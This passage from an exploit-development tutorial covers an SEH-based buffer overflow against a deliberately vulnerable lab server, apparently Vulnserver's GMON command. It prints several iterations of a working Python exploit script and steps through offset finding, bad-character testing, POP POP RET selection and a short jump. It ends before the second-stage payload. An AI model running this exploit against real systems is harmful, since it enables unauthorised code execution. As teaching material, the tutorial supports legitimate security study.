a0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk6Gk7Gk8Gk9Gl&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">pattern</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Payload length: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Sending exploit!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;GMON /.../&#34;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Exploit sent!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] Could not connect to server!&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>Here we can see the EIP is overwritten with <code>336E4532</code>.</p>
<p><img src="/Windows-User-Mode-Exploit-Development-SEH-Part-2/Pattern_Crash.png" alt=""></p>
<p>The offset is located at <code>3518</code> which means that EIP will be overwritten after <code>3518</code> A&rsquo;s</p>
<p><img src="/Windows-User-Mode-Exploit-Development-SEH-Part-2/Pattern_Offset.png" alt=""></p>
<p>Here we modify the exploit to overwrite the EIP register with 4 B&rsquo;s and the rest of the buffer will be padding with C&rsquo;s.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;192.168.81.129&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SEH</span> <span class="o">=</span> <span class="s2">&#34;B&#34;</span> <span class="o">*</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">3518</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">SEH</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">&#34;C&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">5012</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Payload length: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Sending exploit!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;GMON /.../&#34;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Exploit sent!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] Could not connect to server!&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>Now we have full control of the EIP register.</p>
<p><img src="/Windows-User-Mode-Exploit-Development-SEH-Part-2/Controll_EIP.png" alt=""></p>
<h2 id="bad-characters">Bad Characters</h2>
<p>As usual, let&rsquo;s identify the bad characters before finding a <code>POP POP RET</code> just in case one of the addresses has a bad character. We will take out \x00 as it is usually always a bad character.</p>
<p>Depending on the application, vulnerability type and protocols in use, there may be certain characters that can truncate our buffer, which is considered to be bad chars.</p>
<p>An example of a very common bad character (especially in buffer overflows caused by unchecked string copy operations) is the null byte (0x00).</p>
<p>0x00 is considered a bad because a null byte is also used to terminate a string copy operation, which would effectively truncate our buffer to wherever the first null byte appears.</p>
<p>The reason we want to get rid of bad chars is that when we generate our reverse shell using msfvenom we can luckily say which char is a bad one and msfvenom will get rid of it.</p>
<p>We can use the <code>!mona bytearray</code> once again, to generate characters from <code>\x00 to \xFF</code></p>
<p><img src="/Windows-User-Mode-Exploit-Development-SEH-Part-2/Mona_Bytearray.png" alt=""></p>
<p>Let&rsquo;s modify and run the exploit.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;192.168.81.129&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">badchars</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&#34;</span><span class="se">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SEH</span> <span class="o">=</span> <span class="s2">&#34;B&#34;</span> <span class="o">*</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">3518</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">badchars</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">badchars</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">SEH</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">&#34;C&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">5012</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Payload length: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Sending exploit!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;GMON /.../&#34;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Exploit sent!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] Could not connect to server!&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>After searching for our buffer, it seems the only bad char was <code>\x00</code></p>
<p><img src="/Windows-User-Mode-Exploit-Development-SEH-Part-2/badchars.png" alt=""></p>
<h2 id="locating-a-return-address">Locating a Return Address</h2>
<p>Now that we have full control over the EIP register, we need to find a <code>POP POP RET</code> instruction.</p>
<p>Why? Let&rsquo;s go through it again.</p>
<p>In order to get to our buffer, rather than trying to jump at registers such as <code>JMP ESP</code> or <code>JMP EBX</code> we will try to find a sequence of instructions which will lead us to our C&rsquo;s.</p>
<p>So ideally we should be looking for a <code>POP POP RET</code>, which will POP the first value off the stack then the second value off the stack and then return to our user-controlled buffer.</p>
<p>The best way to do this is to use the immunity debugger mona script to search for <code>POP POP RET</code>. We have to make sure our address meets the following criteria:</p>
<ul>
<li>Does not Data Execution Prevention (DEP)</li>
<li>Does not have Address Space Layout Randomization (ASLR) enabled</li>
<li>Does not contain a NULL Byte (00)</li>
<li>Does not SafeSEH enabled</li>
</ul>
<p>What is Safe SEH?</p>
<p>SafeSEH is a protection mechanism that prevents SEH-based exploits by validating exception handlers and storing them in a table. Prior to executing a given exception handler, the addresses in this tabled are checked to ensure it is safe. Due to this, the <code>POP POP RET</code> addresses that are used to overwrite the SEH record will come from a module compiled with <code>SafeSEH</code> and will not appear in the table causing the exploit to fail.</p>
<p>As long as the address of <code>POP POP RET</code> does not come from a module compiled with SafeSEH, we are good to go. By default application modules are not compiled with the <code>SafeSEH</code> and even if they were then you could search for other loaded modules loaded by the application that were not compiled with the <code>SafeSEH</code> using <code>!mona modules</code>.</p>
<p>Feel free to read more about <code>SafeSEH</code> on google.</p>
<p>After running <code>!mona seh</code>, mona reveals that there are a total of 18 pointers, let&rsquo;s pick one the second one <code>625010B4</code> at <code>essfunc.dll</code></p>
<p><img src="/Windows-User-Mode-Exploit-Development-SEH-Part-2/Mona_SEH.png" alt=""></p>
<p>Let&rsquo;s use this address with our exploit to ensure this work.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;192.168.81.129&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#625010B4 \xB4\x10\x50\x62</span>
</span></span><span class="line"><span class="cl"><span class="n">SEH</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\xB4\x10\x50\x62</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">3518</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">SEH</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">&#34;C&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">5012</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Payload length: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Sending exploit!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;GMON /.../&#34;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Exploit sent!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] Could not connect to server!&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>We can put a breakpoint to observe the behaviour. (After searching for the address <code>625010B4</code>, press F2 to put a breakpoint).</p>
<p>We send the exploit and let the exception occur. As you can see, EIP now points to <code>POP</code> followed by another <code>POP</code> and then followed by <code>RET</code>.</p>
<p><img src="/Windows-User-Mode-Exploit-Development-SEH-Part-2/Before_POP.png" alt=""></p>
<p>Now lets press <code>F7</code> to <code>step into</code> and execute the first <code>POP</code></p>
<p>As you see the first <code>POP</code>, POP&rsquo;d the value on the stack into <code>EBX</code></p>
<p><img src="/Windows-User-Mode-Exploit-Development-SEH-Part-2/POP_First.png" alt=""></p>
<p>Now lets press <code>F7</code> to <code>step into</code> and execute the second <code>POP</code></p>
<p>As you see the second <code>POP</code>, POP&rsquo;d the value on the stack into <code>EBP</code></p>
<p><img src="/Windows-User-Mode-Exploit-Development-SEH-Part-2/Second_POP.png" alt=""></p>
<p>Now lets press <code>F7</code> to <code>step into</code> and execute <code>RET</code></p>
<p>As you can see the <code>RET</code> instruction returned execution to the top of the stack, and now we have landed on <code>nSEH</code> which is our 41&rsquo;s, just before our <code>SEH</code> instruction. However, we have around 4 bytes to maneuver around.</p>
<p><img src="/Windows-User-Mode-Exploit-Development-SEH-Part-2/After_RET.png" alt=""></p>
<h2 id="first-stage-payload">First Stage Payload</h2>
<p>So we have succeeded in redirecting the execution flow of the program! Now we have these 4 bytes to work with. Unfortunately, that is not enough to place our shellcode. A standard reverse shell takes anywhere between 350 to 400 bytes of space.</p>
<p>We need to get out of this very tight corner. We could perform a negative jump up the buffer and gain approximately 45 bytes of buffer space to execute our secondary payload.</p>
<p>Let&rsquo;s take a small jump back into the buffer using those 4 bytes as we have plenty of space before. We want to make sure we don&rsquo;t overwrite our <code>SEH -&gt; POP POP RET</code> instructions.</p>
<p>Let&rsquo;s put that in our exploit, make sure you do that math correctly, you must take away if you are adding. Since we want to add nSEH before SEH, we will take away 4 bytes from A&rsquo;s. We must do this process properly or hours will be wasted looking at the screen. Yes, I&rsquo;ve done that before.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;192.168.81.129&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#625010B4 \xB4\x10\x50\x62</span>
</span></span><span class="line"><span class="cl"><span class="n">SEH</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\xB4\x10\x50\x62</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#JMP SHORT \xEB\xD0\x90\x90</span>
</span></span><span class="line"><span class="cl"><span class="n">nSEH</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\xEB\xD0\x90\x90</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">3518</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">nSEH</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">nSEH</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">SEH</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">&#34;C&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">5012</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Payload length: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Sending exploit!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;GMON /.../&#34;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Exploit sent!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] Could not connect to server!&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>We can see that the <code>JMP SHORT</code> instruction will lead us to <code>0188FF96</code> which is somewhere in our A&rsquo;s</p>
<p>Let&rsquo;s put a breakpoint on <code>0188FF96</code> before hitting F7 to step into.</p>
<p><img src="/Windows-User-Mode-Exploit-Development-SEH-Part-2/Before_ShortJump.png" alt=""></p>
<p>Counting the bytes, it seems we have around 45 bytes of space, which won&rsquo;t be enough for a reverse shell. However, there are a few ways&hellip;</p>
<p><img src="/Windows-User-Mode-Exploit-Development-SEH-Part-2/Jump.png" alt=""></p>
<h2 id="second-stage-payload">Second Stage Payload</h2>
